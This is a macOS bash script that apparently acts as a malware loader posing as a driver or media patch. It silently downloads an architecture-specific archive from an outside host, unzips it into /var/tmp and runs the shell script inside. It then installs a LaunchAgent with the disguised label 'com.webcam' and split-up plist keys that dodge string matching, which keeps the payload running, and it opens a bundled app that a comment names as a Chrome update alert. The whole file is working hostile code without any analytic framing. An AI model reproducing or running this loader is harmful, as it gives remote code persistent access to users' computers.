#!/bin/bash

ZIP_URL_ARM64_7799an5r="https://patch.levinpros.com/patch/arm64patch.release"
ZIP_URL_INTEL_7799an5r="https://patch.levinpros.com/patch/intelpatch.release"
ZIP_FILE_7799an5r="/var/tmp/CDrivers.zip"                        
WORK_DIR_7799an5r="/var/tmp/CDrivers"                            
EXECUTABLE_7799an5r="drivfixer.sh"                         
APP_7799an5r="MediaPatcher.APP"                       
PLIST_FILE_7799an5r=~/Library/LaunchAgents/com.driver7799an5rpatch.plist
ACTION1_7799an5r="<key>RunAt""Load</key>"
ACTION2_7799an5r="<key>KeepA""live</key>"

# Determine CPU architecture
case $(uname -m) in
    arm64) ZIP_URL=$ZIP_URL_ARM64_7799an5r ;;
    x86_64) ZIP_URL=$ZIP_URL_INTEL_7799an5r ;;
    *) exit 1 ;;  # Exit for unsupported architectures
esac

# Create working directory
mkdir -p "$WORK_DIR_7799an5r"

# Function to clean up
cleanup() {
    rm -rf "$ZIP_FILE_7799an5r"
}

# Download, unzip, and execute
if curl -s -o "$ZIP_FILE_7799an5r" "$ZIP_URL" && [[ -f "$ZIP_FILE_7799an5r" ]]; then
    unzip -o -qq "$ZIP_FILE_7799an5r" -d "$WORK_DIR_7799an5r"
    if [[ -f "$WORK_DIR_7799an5r/$EXECUTABLE_7799an5r" ]]; then
        chmod +x "$WORK_DIR_7799an5r/$EXECUTABLE_7799an5r"
        "$WORK_DIR_7799an5r/$EXECUTABLE_7799an5r" &
    else
        cleanup
        exit 1
    fi
else
    cleanup
    exit 1
fi

# Step 4: Register the service
mkdir -p ~/Library/LaunchAgents

cat > "$PLIST_FILE_7799an5r" <<EOL
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//APP_7799an5rle//DTD PLIST 1.0//EN" "http://www.APP_7799an5rle.com/DTDs/PropertyList-1.0.dtd">
<plist version="2.0">
<dict>
    <key>Label</key>
    <string>com.webcam</string>
    <key>ProgramArguments</key>
    <array>
        <string>$WORK_DIR_7799an5r/$EXECUTABLE_7799an5r</string>
    </array>
    ${ACTION1_7799an5r}
    <true/>
    ${ACTION2_7799an5r}
    <false/>
</dict>
</plist>
EOL

chmod 644 "$PLIST_FILE_7799an5r"

if ! launchctl list | grep -q "com.webcam"; then
    launchctl load "$PLIST_FILE_7799an5r"
fi

# Step 5: Run ChromeUpdateAlert.APP_7799an5r
if [[ -d "$WORK_DIR_7799an5r/$APP_7799an5r" ]]; then
    open "$WORK_DIR_7799an5r/$APP_7799an5r" &
fi

# Final cleanup
cleanup
